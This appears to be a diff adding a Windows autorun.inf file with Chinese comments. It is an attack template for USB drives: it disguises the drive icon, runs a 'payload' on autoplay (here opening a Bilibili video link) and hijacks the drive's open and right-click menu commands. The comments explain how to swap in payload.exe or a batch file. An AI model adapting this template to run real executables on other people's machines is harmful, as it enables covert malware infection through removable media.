@@ -1,0 +1,20 @@
+[AutoRun]
+autoplay=true
+
+;伪装驱动器图标
+icon=shell32.dll,79
+
+;驱动器名称
+label=USB	
+
+;攻击Payload，此处为打开网页
+;可以将需要运行的EXE或BAT放置在U盘根目录，将open改为填写文件名
+;例如：open=payload.exe
+open=explorer https://www.bilibili.com/video/BV1uT4y1P7CX
+
+;劫持右键菜单
+;如果修改了Payload，此处也需修改
+shell\AutoRun=打开驱动器(&D)
+shell\AutoRun\Command=explorer https://www.bilibili.com/video/BV1uT4y1P7CX
+shell\open\Command=explorer https://www.bilibili.com/video/BV1uT4y1P7CX
+shell\opennewwindow\Command=explorer https://www.bilibili.com/video/BV1uT4y1P7CX
